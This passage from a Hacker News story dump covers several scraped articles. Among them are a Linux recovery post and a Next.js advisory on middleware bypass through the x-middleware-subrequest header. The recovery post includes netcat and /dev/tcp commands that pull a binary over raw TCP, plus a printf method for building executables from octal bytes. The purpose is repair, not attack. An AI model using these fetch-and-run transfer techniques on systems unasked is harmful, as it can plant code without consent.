and...\n\n\t\t\t\t\t\t\t\tHubble Tracks Bright Auroras on Jupiter (Composite Video Sequence 1)\n\n\t\t\t\t\t\t\t\tThis composite video illustrates the auroras on Jupiter relative to their position on the giant planet. As on Earth, auroras are produced by the interaction of a planet's magnetic field with its atmosphere. The Jupiter auroras observed by NASA's Hubble Space Telescope are some...\n\n\t\t\t\t\t\t\t\tHubble Tracks Bright Auroras on Jupiter (Composite Video Sequence 2)\n\n\t\t\t\t\t\t\t\tThis composite video illustrates the auroras on Jupiter relative to their position on the giant planet. As on Earth, auroras are produced by the interaction of a planet's magnetic field with its atmosphere. The Jupiter auroras observed by NASA's Hubble Space Telescope are some...\n\n\t\t\t\t\tShare\n\n\t\t\t\t\tDetails\n\n\t\t\t\t\t\tLast Updated\n\n\t\t\t\t\tMar 20, 2025\n\n\t\t\tLocationNASA Goddard Space Flight Center\n\n\t\t\t\t\t\t\tContact\n\n\t\t\t\t\t\tMediaClaire Andreoli\nNASA’s Goddard Space Flight Center\nGreenbelt, Maryland\nclaire.andreoli@nasa.gov\n\n\t\t\t\t\t\t\tCredits\n\n\t\t\t\t\t\tNASA, ESA, and J. Nichols (University of Leicester);\nAcknowledgment: A. Simon (NASA/GSFC) and the OPAL team\n\n\tRelated TermsHubble Space TelescopeAstrophysicsExoplanet AtmosphereGoddard Space Flight CenterJupiterPlanetary Environments & AtmospheresPlanetsThe Solar System\n\t\t\t\t\t\tRelated Links and Documents\n\nHubble-Europe’s Release\nNASA’s Hubble Portal\n\n\t\t\t\t\tKeep Exploring\n\t\t\t\t\tDiscover More Topics From Hubble\n\n\t\t\t\t\t\t\t\tHubble Space Telescope\n\n\t\t\t\t\t\t\tSince its 1990 launch, the Hubble Space Telescope has changed our fundamental understanding of the universe.\n\n\t\t\t\t\t\t\t\tHubble Science Highlights\n\n\t\t\t\t\t\t\t\tHubble Images\n\n\t\t\t\t\t\t\t\tHubble News",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "338962ecabfcc9a6",
    "title": {
      "en": "When you deleted /lib on Linux while still connected via SSH (2022)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://tinyhack.com/2022/09/16/when-you-deleted-lib-on-linux-while-still-connected-via-ssh/",
    "score": 128,
    "by": "todsacerdoti",
    "time": 1742628245,
    "content": "When you deleted /lib on Linux while still connected via ssh\n\nLet’s first not talk about why this can happen, but deleting /lib, /usr/lib, or some other essential runtime files happens quite a lot (as you can see: here, here, here, and here). In this post, I will only discuss what happens when you delete /lib on Linux and how to recover from that.\n\nThe easy solution for everything is to replace the missing files, but this can be difficult if /lib is deleted because we won’t have ld-linux, which is needed to run any dynamic executable. When you deleted /lib, all non-static executable (such as ls, cat, etc, will output):\n\n1No such file or directory\n\nYou will also be unable to open any new connection using ssh, or open a new tmux window/pane if you are using tmux. So you can only rely on your current shell built in, and some static executables that you have on the system.\n\nIf you have a static busybox installed, then it can be your rescue. You can use wget from busybox to download libraries from a clean system.  For your information: Debian has busybox installed by default, but the default is not the static version.\n\nMinimal Debian install\n\nIf you are worried that this kind of problem might happen to you in the future: Install the static version of the busybox binary, and confirm that it is the correct version.\n\nInstalling static busybox\n\nBash to the rescue\n\nI assume right now that you don’t have a static busybox, and you don’t even have any static executables (which is the situation in many cases, like in the default install of minimal Debian). My solution for this is to download a static busybox from another machine.\n\nI also assume that you have bash installed (which is the default for most systems).  Bash has a lot of default built-ins that we can use.  There is a solution from here that can be used to download a file using only built-in bash functions. Other solutions on this thread rely on external command (such as cat).  Please note that you need to set the environment  variable LANG to C; Otherwise, this script will incorrectly handle Unicode bytes.\n\nOf course, we can’t chmod the destination file to be executable, so we need to overwrite an existing executable. If you have busybox installed (even if it is the non-static version), you can overwrite this file. At this point, you can start the rescue mission: for example, use wget to download fresh /lib from another system.\n\nPlease note that busybox can’t function with a name that is not a busybox applet name. So if you overwrite for example, the fmt binary with busybox, then it won’t work (it will say: applet not found).  If you don’t have busybox, I suggest overwriting cp, then you can use cp to create a copy of cp as busybox (which will be executable).\n\ncp to busybox\n\nNo bash? printf can help\n\nIf you have a more advanced shell (e.g: zsh), it has TCP modules already built in. You can easily use nc from another machine to send a file to the target machine. Now, let’s assume that you have a very basic shell, for example: dash. Most shell  (including dash), has printf as built-in, and we can use this to construct binary files.\n\nMost (all?) shell’s built-in  printf implementation supports \\ooo where ooo  is 3 digit octal. First approach is to just convert busybox, but this file is quite big (2 megabyte). Copy-pasting  large printf commands is tedious and is error-prone. We need a small static binary that can help us.\n\nThis printf trick will also work for other OS, if you can create a small binary for that OS.\n\nCreating a small ELF for Linux\n\nYou can create a very tiny executable if you use assembly directly, but let’s try to do this using C, so it can be portable across different architectures. The smallest useful program that I can think of is just to copy from stdin to stdout, so we can prepare netcat on a machine:\n\ncat busybox | nc -v -l -p 10000\n\nand then we can do this from the borked machine:\n\nfdio < /dev/tcp/192.168.1.168/10000 > busybox\n\nThe source code can be like this:\n\n12345678910111213#include \"unistd.h\"int main(){char x;while (1) {int c = read(0, &x, 1);if (c!=0) break;c = write(1, &x, 1);if (c!=0) break;}return 0;}\n\nIf we try to compile this with standard C library (on AMD64 machine), the result is 776KB.\n\n$ gcc -Os -static fd.c\n$ du -hs a.out\n768K    a.out\n\nThe Linux kernel source code contains a nolibc implementation that we can use. Using this compilation option:\n\ngcc -Os -Wl,--build-id=none -fno-asynchronous-unwind-tables -fno-ident -s -nostdlib -nodefaultlibs -static -include nolibc.h fd.c -lgcc -o fd\n\nWe get a 4536 bytes binary. Quite good. If we add -z max-page-size=0x04, we can even get a smaller size.\n\ngcc -Os -Wl,--build-id=none -z max-page-size=0x04 -fno-asynchronous-unwind-tables -fno-ident -s -nostdlib -nodefaultlibs -static -include nolibc.h fd.c -lgcc -o fd\n\nIt is now 672 bytes. Small enough to transfer. We can convert this using Python.\n\n12345678910111213141516171819import syswith open(sys.argv[1], \"rb\") as f:data = f.read()start = 0width = 20targetname = sys.argv[2]while True:part = data[start:start+width]if part=='':breaka = ''.join(['\\\\'+(oct(ord(i)).zfill(3))[-3:] for i in part])dest = '>'if start>0:dest += '>'dest += ' ' + targetnameprint(\"printf '{}' {} \".format(a, dest))start += width\n\nWe can then copy paste this to our ssh session, then do the /dev/tcp redirection trick.\n\nOutput example\n\nOf course, we can also write a complete program that makes the TCP connection instead of relying on bash redirection.\n\nI hope you will never need this knowledge\n\nThis problem occurred to me a few days ago when I updated my Solar Powered Pi Zero, and somehow /lib got deleted (not sure what caused it). This is not a very important machine, and I could have just reimaged the MicroSD card and be done with it, but I was curious if I could recover from the error.\n\nI hope you will never have this error on your production/important machine, but if you have this problem in the future, I hope this post will help you recover from the situation.\n\n\t\tAuthor  adminPosted on September 16, 2022September 16, 2022Categories debian, hacks, linux",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "79d3b9dd2357223c",
    "title": {
      "en": "Blue Ghost lander captures sunset shots on moon before falling silent",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://phys.org/news/2025-03-blue-ghost-lander-captures-stunning.html",
    "score": 69,
    "by": "pseudolus",
    "time": 1742381137,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e2aca39a1f826fca",
    "title": {
      "en": "Italy demands Google poison DNS under strict Piracy Shield law",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/gadgets/2025/03/italian-court-orders-google-to-block-iptv-pirate-sites-at-dns-level/",
    "score": 127,
    "by": "DanAtC",
    "time": 1742672764,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2852f55e961e65fa",
    "title": {
      "en": "Next.js version 15.2.3 has been released to address a security vulnerability",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://nextjs.org/blog/cve-2025-29927",
    "score": 120,
    "by": "makepanic",
    "time": 1742678347,
    "content": "Back to BlogSaturday, March 22nd 2025CVE-2025-29927Posted byLee Robinson@leerobNext.js version 15.2.3 has been released to address a security vulnerability (CVE-2025-29927). Additionally, backported patches are available.\nWe recommend that all self-hosted Next.js deployments using next start and output: 'standalone' should update immediately.\nContinue reading for more details on the CVE.\nTimeline\n\n2025-02-27T06:03Z: Disclosure to Next.js team via GitHub private vulnerability reporting\n2025-03-14T17:13Z: Next.js team started triaging the report\n2025-03-14T19:08Z: Patch pushed for Next.js 15.x\n2025-03-14T19:26Z: Patch pushed for Next.js 14.x\n2025-03-17T22:44Z: Next.js 14.2.25 released\n2025-03-18T00:23Z: Next.js 15.2.3 released\n2025-03-18T18:03Z: CVE-2025-29927 issued by GitHub\n2025-03-21T10:17Z: Security Advisory published\n2025-03-22T21:21Z: Next.js 13.5.9 released\n\nWe are also publishing a backport for v12. We will update this post as they are released.\nVulnerability details\n\nNext.js uses an internal header x-middleware-subrequest to prevent recursive requests from triggering infinite loops. The security report showed it was possible to skip running Middleware, which could allow requests to skip critical checks—such as authorization cookie validation—before reaching routes.\nImpact scope\n\nAffected\n\nSelf-hosted Next.js applications using Middleware (next start with output: standalone)\nThis affects you if you rely on Middleware for auth or security checks, which are not then validated later in your application.\nApplications using Cloudflare can turn on a Managed WAF rule\n\nNot affected\n\nApplications hosted on Vercel\nApplications hosted on Netlify\nApplications deployed as static exports (Middleware not executed)\n\nPatched versions\n\nFor Next.js 15.x, this issue is fixed in 15.2.3\nFor Next.js 14.x, this issue is fixed in 14.2.25\nFor Next.js 13.x, this issue is fixed in 13.5.9\n\nIf patching to a safe version is infeasible, it is recommended that you prevent external user requests which contain the x-middleware-subrequest header from reaching your Next.js application.\nWe are also publishing a backport for v12. We will update this post as they are released.\nOur security responsibility\n\nNext.js has published 16 security advisories since 2016. Over time, we've continued to improve how we gather, patch, and disclose vulnerabilities.\nGitHub Security Advisories and CVEs are industry-standard approaches to notifying users, vendors, and companies of vulnerabilities in software. While we have published a CVE, we missed the mark on partner communications.\nTo help us more proactively work with partners depending on Next.js, and other infrastructure providers, we are opening a partner mailing list. Please reach out to partners@nextjs.org to be included.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ba85cdd2931b74b2",
    "title": {
      "en": "IETF setting standards for AI preferences",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.ietf.org/blog/aipref-wg/",
    "score": 27,
    "by": "Mithriil",
    "time": 1742650221,
    "content": "The IETF meeting network is taking steps towards a bigger Internet\n                The “ietf-ipv6-mostly” WiFi SSID at IETF 122 Bangkok will allow devices to signal a preference for IPv6-only operation while still supporting IPv4 (if needed) via translation mechanisms. Onsite participants are encouraged to try this service when they connect to the IETF meeting network.\n\n                    Sean Croghan\n\n                IETF Meeting Network Operations Center Lead\n\n                14 Mar 2025\n\n                A Sustainable Internet: How to get there from here?\n                After a successful side meeting during the IETF 121 Dublin meeting, the new Sustainability and the Internet (SUSTAIN) Proposed Research Group will have its first meeting during IETF 122 Bangkok. You might be wondering, what is this Research Group about?\n\n                    Ali Rezaki\n\n                SUSTAIN Research Group Co-chair\n\n                    Eve Schooler\n\n                SUSTAIN Research Group Co-chair\n\n                    Michael Welzl\n\n                SUSTAIN Research Group Co-chair\n\n                5 Mar 2025\n\n                IETF email service issues resolved as of 4 March 2025\n                The IETF email processing system delays reported on 3 March 2025 have been resolved. All messages in the queue were delivered by 0700 UTC on 4 March and the system is now keeping up.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                4 Mar 2025\n\n                Suggested IETF 122 Sessions for Getting Familiar with New Topics\n                These IETF 122 meeting sessions are likely to include discussions and proposals that are accessible to a broad range of Internet technologists whether they are new to the IETF or long-time participants.\n\n                21 Feb 2025\n\n                IETF email service transition completed on 24 February\n                The IETF email processing infrastructure transition planned for 0900-1100 UTC on 24 February has been completed.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                14 Feb 2025\n\n                Show all\n\n                IETF News\n\n                            Blog listing\n\n                The IETF meeting network is taking steps towards a bigger Internet\n                The “ietf-ipv6-mostly” WiFi SSID at IETF 122 Bangkok will allow devices to signal a preference for IPv6-only operation while still supporting IPv4 (if needed) via translation mechanisms. Onsite participants are encouraged to try this service when they connect to the IETF meeting network.\n\n                    Sean Croghan\n\n                IETF Meeting Network Operations Center Lead\n\n                14 Mar 2025\n\n                A Sustainable Internet: How to get there from here?\n                After a successful side meeting during the IETF 121 Dublin meeting, the new Sustainability and the Internet (SUSTAIN) Proposed Research Group will have its first meeting during IETF 122 Bangkok. You might be wondering, what is this Research Group about?\n\n                    Ali Rezaki\n\n                SUSTAIN Research Group Co-chair\n\n                    Eve Schooler\n\n                SUSTAIN Research Group Co-chair\n\n                    Michael Welzl\n\n                SUSTAIN Research Group Co-chair\n\n                5 Mar 2025\n\n                IETF email service issues resolved as of 4 March 2025\n                The IETF email processing system delays reported on 3 March 2025 have been resolved. All messages in the queue were delivered by 0700 UTC on 4 March and the system is now keeping up.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                4 Mar 2025\n\n                Suggested IETF 122 Sessions for Getting Familiar with New Topics\n                These IETF 122 meeting sessions are likely to include discussions and proposals that are accessible to a broad range of Internet technologists whether they are new to the IETF or long-time participants.\n\n                21 Feb 2025\n\n                IETF email service transition completed on 24 February\n                The IETF email processing infrastructure transition planned for 0900-1100 UTC on 24 February has been completed.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                14 Feb 2025\n\n                Show all\n\n    Show filters\n\n    Filter by topic and date\n\n        Topic\n\n            All\n\n                    General Area\n\n                    Transport Area (tsv)\n\n                    Operations and Management Area\n\n                    Internet Architecture Board\n\n                    News\n\n                    Internet of Things\n\n                    Security & Privacy\n\n                    IRTF\n\n                    Applications and Real-Time Area\n\n                    IETF-LLC\n\n                    Security Area (sec)\n\n        Date from\n\n        Date to\n\n    Filter\n\nFilter by topic and date\n\n        Topic\n\n            All\n\n                    General Area\n\n                    Transport Area (tsv)\n\n                    Operations and Management Area\n\n                    Internet Architecture Board\n\n                    News\n\n                    Internet of Things\n\n                    Security & Privacy\n\n                    IRTF\n\n                    Applications and Real-Time Area\n\n                    IETF-LLC\n\n                    Security Area (sec)\n\n        Date from\n\n        Date to\n\n                Filter\n\n                        IETF setting standards for AI preferences\n\n                    Suresh Krishnan\n\n                AIPREF Working Group Co-chair\n\n                    Mark Nottingham\n\n                AIPREF Working Group Co-chair\n\n                        27 Feb 2025\n                        The newly-chartered AI Preferences (AIPREF) Working Group will work on standardizing building blocks that allow for the expression of preferences about how content is collected and processed for Artificial Intelligence (AI) model development, deployment, and use.\n\nThe use of Internet content for training large language models (\"AI\") has become a contentious topic. Training a model requires voluminous information, and the Internet is readily available as a source of diverse content. However, many publishers and authors object to these new uses of their work without permission or compensation.While the IETF doesn't take a position on the legal questions in this space, we do track developments, and last September the IAB AI-CONTROL Workshop highlighted a need for clearer communication between content publishers and AI model trainers.Right now, AI vendors use a confusing array of non-standard signals in the robots.txt file (defined by RFC 9309) and elsewhere to guide their crawling and training decisions. As a result, authors and publishers lose confidence that their preferences will be adhered to, and resort to measures like blocking their IP addresses.To address this need, the AIPREF working group has been chartered to define:a common vocabulary to express authors' and publishers' preferences regarding use of their content for AI training and related tasks, andmeans of attaching that vocabulary to content on the Internet, either by embedding it in the content or by formats similar to robots.txt, and a standard mechanism to reconcile multiple expressions of preferences.The Working Group will hold its first meeting during IETF 122 Bangkok, where administrative and initial scoping discussions will take place. Shortly thereafter, it will hold an interim meeting from 8-10 April in Brussels, Belgium. This is an open meeting, but registration is required.If you are interested in monitoring or participating in this work, subscribe to the AIPREF working group mailing list.\n\n    Share this page\n\n                                    PreviousSuggested IETF 122 Sessions for Getting Familiar with New Topics\n\n                                    NextIETF email service issues resolved as of 4 March 2025\n\n                The IETF meeting network is taking steps towards a bigger Internet\n                The “ietf-ipv6-mostly” WiFi SSID at IETF 122 Bangkok will allow devices to signal a preference for IPv6-only operation while still supporting IPv4 (if needed) via translation mechanisms. Onsite participants are encouraged to try this service when they connect to the IETF meeting network.\n\n                    Sean Croghan\n\n                IETF Meeting Network Operations Center Lead\n\n                14 Mar 2025\n\n                A Sustainable Internet: How to get there from here?\n                After a successful side meeting during the IETF 121 Dublin meeting, the new Sustainability and the Internet (SUSTAIN) Proposed Research Group will have its first meeting during IETF 122 Bangkok. You might be wondering, what is this Research Group about?\n\n                    Ali Rezaki\n\n                SUSTAIN Research Group Co-chair\n\n                    Eve Schooler\n\n                SUSTAIN Research Group Co-chair\n\n                    Michael Welzl\n\n                SUSTAIN Research Group Co-chair\n\n                5 Mar 2025\n\n                IETF email service issues resolved as of 4 March 2025\n                The IETF email processing system delays reported on 3 March 2025 have been resolved. All messages in the queue were delivered by 0700 UTC on 4 March and the system is now keeping up.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                4 Mar 2025\n\n                Suggested IETF 122 Sessions for Getting Familiar with New Topics\n                These IETF 122 meeting sessions are likely to include discussions and proposals that are accessible to a broad range of Internet technologists whether they are new to the IETF or long-time participants.\n\n                21 Feb 2025\n\n                IETF email service transition completed on 24 February\n                The IETF email processing infrastructure transition planned for 0900-1100 UTC on 24 February has been completed.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                14 Feb 2025\n\n                Show all",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "726b90c4eed19c94",
    "title": {
      "en": "EU confirms Apple can make a portless iPhone without USB-C",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://9to5mac.com/2025/03/19/eu-confirms-apple-can-make-a-portless-iphone-without-usb-c/",
    "score": 17,
    "by": "ksec",
    "time": 1742389603,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d209cefdecea71a4",
    "title": {
      "en": "Monster Cables picked the wrong guy to threaten (2008)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.oncontracts.com/monster-cables-picked-the-wrong-guy-to-threaten/",
    "score": 513,
    "by": "wallflower",
    "time": 1742603437,
    "content": "Monster Cables picked the wrong guy to threaten by Dell C. \"D. C.\" Toedt III on 2008-04-16Monster Cables, which makes extremely high-priced stereo cables, has apparently sent a cease-and-desist letter to Blue Jeans Cable, alleging various kinds of infringement.  Bad move – the president of Blue Jeans Cable, Kurt Denke, is a former litigator who responded pretty forcefully:… Once I have received the above materials and explanations from you, I will undertake to analyze this information and let you know whether we are willing to accede to any of the demands made in your letter. If my analysis shows that there is any reasonable likelihood that we have infringed in any way any of Monster Cable’s intellectual property rights, we will of course take any and all action necessary to resolve the situation.  If I do not hear from you within the next fourteen days, or if I do hear from you but do not receive all of the information requested above, I will assume that you have abandoned these claims and closed your file. As for your requests for information, or for action, directed to me: I would remind you that it is you, not I, who are making claims; and it is you, not I, who must substantiate those claims.  You have not done so. I have seen Monster Cable take untenable IP positions in various different scenarios in the past, and am generally familiar with what seems to be Monster Cable’s modus operandi in these matters.  I therefore think that it is important that, before closing, I make you aware of a few points. After graduating from the University of Pennsylvania Law School in 1985, I spent nineteen years in litigation practice, with a focus upon federal litigation involving large damages and complex issues.  My first seven years were spent primarily on the defense side, where I developed an intense frustration with insurance carriers who would settle meritless claims for nuisance value when the better long-term view would have been to fight against vexatious litigation as a matter of principle. In plaintiffs’ practice, likewise, I was always a strong advocate of standing upon principle and taking cases all the way to judgment, even when substantial offers of settlement were on the table.  I am “uncompromising” in the most literal sense of the word.  If Monster Cable proceeds with litigation against me I will pursue the same merits-driven approach; I do not compromise with bullies and I would rather spend fifty thousand dollars on defense than give you a dollar of unmerited settlement funds. As for signing a licensing agreement for intellectual property which I have not infringed: that will not happen, under any circumstances, whether it makes economic sense or not. I say this because my observation has been that Monster Cable typically operates in a hit-and-run fashion.  Your client threatens litigation, expecting the victim to panic and plead for mercy; and what follows is a quickie negotiation session that ends with payment and a licensing agreement.  Your client then uses this collection of licensing agreements to convince others under similar threat to accede to its demands.  Let me be clear about this: there are only two ways for you to get anything out of me.  You will either need to (1) convince me that I have infringed, or (2) obtain a final judgment to that effect from a court of competent jurisdiction. It may be that my inability to see the pragmatic value of settling frivolous claims is a deep character flaw, and I am sure a few of the insurance carriers for whom I have done work have seen it that way; but it is how I have done business for the last quarter-century and you are not going to change my mind.  If you sue me, the case will go to judgment, and I will hold the court’s attention upon the merits of your claims–or, to speak more precisely, the absence of merit from your claims–from start to finish. Not only am I unintimidated by litigation; I sometimes rather miss it.(Emphasis added; hat tip: Jeff Nolan at Venture Chronicles.)I can relate to Denke’s final comment quoted above ….  I wonder what the attendant publicity is doing for his sales. See also (list is generated automatically):A better way of nipping business legal disputes in the bud: Cut the crap and just exchange the relevant information A few years back, mentioned a few minutes ago, the CEO of Blue Jeans Cable, a former litigator, responded pretty forcefully to a cease and...ABA Project:  Model Case Management Orders for Patent Cases Several years ago, I chaired a special committee of the American Bar Association’s Section of Intellectual Property Law. We set out to develop some model...Take a lesson from Indiana Jones:  Never threaten to sue – either do it, or don’t Some lawyers seem to think that “cease and desist” and “demand” letters should threaten a lawsuit if the other side doesn’t do what’s demanded. It’s...Feed footer problem solved – URL was wrong I spent a good bit of yesterday trying to track down why the feed for this blog ran the paragraphs together and didn’t include footer...{ 0 comments… add one } Cancel replyLeave a Comment Name *  Email *  Website  Comment Notify me of follow-up comments by email. Notify me of new posts by email.   ΔThis site uses Akismet to reduce spam. Learn how your comment data is processed.Next post: A better way of nipping business legal disputes in the bud: Cut the crap and just exchange the relevant informationPrevious post: Signed Google’s non-competition clause, then got laid off",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "7a0fca0fc8e6db74",
    "title": {
      "en": "Safe Shell String Interpolation",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://samwing.dev/posts/zJonlrXabVoc",
    "score": 15,
    "by": "Wingy",
    "time": 1742665045,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2927e58e39ce09ff",
    "title": {
      "en": "Frink",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://frinklang.org/",
    "score": 204,
    "by": "lisper",
    "time": 1742585957,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a289ba8566d52c12",
    "title": {
      "en": "'Naive' science fan faces jail for plutonium import",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://au.news.yahoo.com/naive-science-fan-faces-jail-053025281.html",
    "score": 17,
    "by": "geox",
    "time": 1742687196,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "37cdc755902b21bc",
    "title": {
      "en": "France rejects backdoor mandate",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.eff.org/deeplinks/2025/03/win-encryption-france-rejects-backdoor-mandate",
    "score": 940,
    "by": "hn_acker",
    "time": 1742589311,
    "content": "In a moment of clarity after initially moving forward a deeply flawed piece of legislation, the French National Assembly has done the right thing: it rejected a dangerous proposal that would have gutted end-to-end encryption in the name of fighting drug trafficking. Despite heavy pressure from the Interior Ministry, lawmakers voted Thursday night (article in French) to strike down a provision that would have forced messaging platforms like Signal and WhatsApp to allow hidden access to private conversations.\nThe vote is a victory for digital rights, for privacy and security, and for common sense.\nThe proposed law was a surveillance wishlist disguised as anti-drug legislation. Tucked into its text was a resurrection of the widely discredited \"ghost” participant model—a backdoor that pretends not to be one. Under this scheme, law enforcement could silently join encrypted chats, undermining the very idea of private communication. Security experts have condemned the approach, warning it would introduce systemic vulnerabilities, damage trust in secure communication platforms, and create tools ripe for abuse.\nThe French lawmakers who voted this provision down deserve credit. They listened—not only to French digital rights organizations and technologists, but also to basic principles of cybersecurity and civil liberties. They understood that encryption protects everyone, not just activists and dissidents, but also journalists, medical professionals, abuse survivors, and ordinary citizens trying to live private lives in an increasingly surveilled world.\nA Global Signal\nFrance’s rejection of the backdoor provision should send a message to legislatures around the world: you don’t have to sacrifice fundamental rights in the name of public safety. Encryption is not the enemy of justice; it’s a tool that supports our fundamental human rights, including the right to have a private conversation. It is a pillar of modern democracy and cybersecurity.\nAs governments in the U.S., U.K., Australia, and elsewhere continue to flirt with anti-encryption laws, this decision should serve as a model—and a warning. Undermining encryption doesn’t make society safer. It makes everyone more vulnerable.\nThis victory was not inevitable. It came after sustained public pressure, expert input, and tireless advocacy from civil society. It shows that pushing back works. But for the foreseeable future, misguided lobbyists for police national security agencies will continue to push similar proposals—perhaps repackaged, or rushed through quieter legislative moments.\nSupporters of privacy should celebrate this win today. Tomorrow, we will continue to keep watch.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "98594b6648724a35",
    "title": {
      "en": "CEO of Kubient sentenced for fraud",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/gadgets/2025/03/ceo-of-ai-ad-tech-firm-pledging-world-free-of-fraud-sentenced-for-fraud/",
    "score": 149,
    "by": "pseudolus",
    "time": 1742677360,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "cf48a834519f255b",
    "title": {
      "en": "Don't Be Afraid of Types",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://lmika.org/2025/03/18/dont-be-afraid-of-types.html",
    "score": 104,
    "by": "speckx",
    "time": 1742323980,
    "content": "I found that there’s a slight aversion to creating new types in the codebases I work in. I saw it during my early days while I was working in Java projects, and I see it today in the occasional Go project. Function bodies with lots of local variables, functions that take a large number of arguments or returning a large number of results, extensions to existing types rather than making new ones. It’s a strange phenomenon.\nI can’t explain why this is. Maybe it’s a fear of feeling like you’re tampering with the “grand design” of the codebase. This is plausible as it was the feeling I had as a junior dev. Afraid to create new classes in Java thinking that I’m introducing a new concept to the project that others had to deal with going forward. _I can add all the verbs I want, but who am _ I to introduce a new noun?\nThis is obviously a ridiculous notion when you think about it for more than a few seconds. If you come up with a concept or a series of values that naturally go together, so much so that you’re carrying them together as a series of arguments through multiple function calls, it’s probably in your interested to make a type for it. That’s what the type system is for: a means of grouping similar bits of information into an easy-to-use whole.\nThis makes total sense for the application models: the entities to which you’re software’s reason for being hinges on. But I’ve found it useful to make types for the lesser bits of information: requests from handlers passed through to the service layer, for instance. Just now, I’m working on some code that deals with creating subscriptions. I need to carry the office ID, customer ID, price ID, the subscription quantity, the tax settings, and the subscription metadata from the API handler all the way through to the Stripe client. This is less than what the subscription model deals with, but it’s still a pain to carry these six bits of information separately through the unmarshalling logic, the validation logic, and then through to the server.\nSo what did I do? I made a “CreateSubscriptionRequest” struct, a new type. Yes, it’s not going to be reusable, but who cares? It makes the code and my life simpler. And honestly, I think the whole “object-orientated approach” to software design really screwed up our thinking here. There was this feeling in the zeitgeist that types and classes are sacred, and that to create a new one is a privilege bestowed only to the leads, architects, and anyone else that had write access to the UML diagrams. Each type was to be an artefact of design, probably because of how much baggage came from defining a new one: they had to be in a separate file, must have seven different constructors, and the fields must be mediated through the use of getters and setters. And if you need something similar to what you’re working on, you didn’t “copy-and-paste” like some animal; you inherited or composed what was there. Given all this, it’s probably understandable that creating new types felt like a decision with a significant bit of “weight”; and who are you, mere lowly junior developer, to make such a decision to create a type just to make it easier to handle data from your handler?\nI think the culture around C and Go have got it right. Need to carry a few things for a single function? Create a new type. Don’t worry that it’s used only for a single function. Don’t worry that it only contains a subset of fields of the model you’re operating on.1\nNow obviously it’s possible to go too far, and start having way too many types than is necessary. Don’t forget that a new type is a bit more cognitive load, as the person maintaining you application will now need to unpack and reference your type when they need to work on it. Just stick with what you need, and make it clear what the purpose of the type is. “CreateSubscriptionRequest” makes it plan that this type only deals with the areas of a code that creates subscriptions, and will probably only make sense through those code paths.\nBut take it from someone that’s had do deal with codes passing through and returning several values of strings, ints, and bools through a series of function calls: a single struct value is much easier to work with. All it takes is the courage for someone to say “yes, that should be a type.”\nDon’t be afraid for that someone to be you.\n\nIn fact, that might actually better than using the model type and adding “this field is ignored, that field must be zero, etc. etc.” in the function docs.↩︎",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ed5d15f12be2c53a",
    "title": {
      "en": "Locks, leases, fencing tokens, FizzBee",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://surfingcomplexity.blog/2025/03/03/locks-leases-fencing-tokens-fizzbee/",
    "score": 42,
    "by": "azhenley",
    "time": 1742335006,
    "content": "Locks, leases, fencing tokens,FizzBee!\n\n\t\t\t\tLorin Hochstein\n\n\t\t\t\t\tformal methods\n\n\t\t\t\tMarch 3, 2025March 3, 2025\n\n\t\t\t7 Minutes\n\nFizzBee is a new formal specification language, originally announced back in May of last year. FizzBee’s author, Jayaprabhakar (JP) Kadarkarai, reached out to me recently and asked me what I thought of it, so I decided to give it a go.\n\nTo play with FizzBee, I decided to model some algorithms that solve the mutual exclusion problem, more commonly known as locking. Mutual exclusion algorithms are a classic use case for formal modeling, but here’s some additional background motivation: a few years back, there was an online dust-up between Martin Kleppmann (author of the excellent book Designing Data-Intensive Applications, commonly referred to as DDIA) and Salvatore Sanfilippo (creator of Redis, and better known by his online handle antirez). They were arguing about the correctness of an algorithm called Redlock that claims to achieve fault-tolerant distributed locking. Here are some relevant links:\n\nDistributed Locks with Redis – description of the Redlock algorithm\n\nHow to do distributed locking – Kleppmann’s critique of the Redlock algorithm\n\nIs Redlock safe? – antirez’s rebuttal to Kleppmann\n\nAs a FizzBee exercise, I wanted to see how difficult it was to model the problem that Kleppmann had identified in Redlock.\n\nKeep in mind here that I’m just a newcomer to the language writing some very simple models as a learning exercise.\n\nCritical sections\n\nHere’s my first FizzBee model, it models the execution of two processes, with an 